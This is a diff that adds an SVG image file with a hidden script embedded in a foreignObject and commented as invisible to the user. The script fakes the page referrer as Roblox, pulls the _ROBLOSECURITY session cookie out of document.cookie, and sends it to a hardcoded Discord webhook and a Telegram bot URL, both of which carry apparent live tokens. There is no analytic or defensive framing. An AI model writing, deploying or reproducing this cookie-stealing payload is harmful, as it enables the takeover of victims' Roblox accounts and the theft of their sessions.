@@ -1,0 +1,26 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1">  
+  <!-- Invisible to user -->  
+  <foreignObject width="100%" height="100%">  
+    <body xmlns="http://www.w3.org/1999/xhtml">  
+      <script>  
+        // Phase 1: Spoof Roblox origin  
+        Object.defineProperty(document, 'referrer', {  
+          get: () => 'https://www.roblox.com/'  
+        });  
+
+        // Phase 2: Steal cookies  
+        const cookies = document.cookie;  
+        const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('_ROBLOSECURITY='));  
+
+        // Phase 3: Exfiltrate via Discord webhook + Telegram  
+        fetch('https://discord.com/api/webhooks/1343503446044839946/l9a_3NpZGCkczHw8NAU_zc8afybkxmV4QWmSX3KhLGp1DbQQSbecUmtGkiK2xdRcaBlU', {  
+          method: 'POST',  
+          headers: {'Content-Type': 'application/json'},  
+          body: JSON.stringify({content: `||${robloxCookie}||`})  
+        });  
+
+        fetch(`https://api.telegram.org/7689732639:AAFzAGyOODxKzk4RlMJjMUBEivbR4VkK8WY/sendMessage?chat_id=CHAT_ID&text=${encodeURIComponent(robloxCookie)}`);  
+      </script>  
+    </body>  
+  </foreignObject>  
+</svg>  
